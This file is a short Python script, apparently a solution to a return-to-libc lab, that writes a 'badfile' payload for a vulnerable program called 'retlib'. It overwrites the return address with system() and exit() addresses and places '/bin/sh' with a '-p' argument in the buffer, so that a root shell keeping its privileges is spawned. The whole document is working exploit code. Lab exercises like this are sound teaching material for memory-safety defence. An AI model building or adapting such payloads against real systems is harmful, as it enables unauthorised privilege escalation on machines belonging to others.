#!/usr/bin/env python3

##### dont use the /bin/sh process to find the address with a script, this string is put directly as string 
import sys

# Fill content with non-zero values
content = bytearray(0xaa for i in range(72))

buffer_addr = 0xffffcdb0 # find this when you execute ./retlib 'Address of buffer[] inside bof():...'
arr = 44

X = 36
sh_addr = buffer_addr + arr       # The address of "/bin/sh generated from this script"
content[X:X+4] = (sh_addr).to_bytes(4,byteorder='little')

Y = 28
system_addr = 0xf7e12420   # The address of system() | obtain this from 'gdb -q retlib; p system' debug
content[Y:Y+4] = (system_addr).to_bytes(4,byteorder='little')

Z = 32
exit_addr = 0xf7e04f80     # The address of exit() | obtain this from 'gdb -q retlib; p exit' debug
content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')

content[arr:arr + 8] = bytearray(b'/bin/sh\x00')
content[arr + 8: arr + 12] = bytearray(b'-p\x00\x00')
content[arr + 16: arr + 20] = (buffer_addr + arr).to_bytes(4, byteorder='little')
content[arr + 20: arr + 24] = (buffer_addr + arr + 8).to_bytes(4, byteorder='little')
content[arr + 24: arr + 28] = bytearray(b'\x00' * 4)

content[X + 4: X + 8] = (buffer_addr + arr + 16).to_bytes(4, byteorder = 'little')

# Save content to a file
with open("badfile", "wb") as f:
  f.write(content)
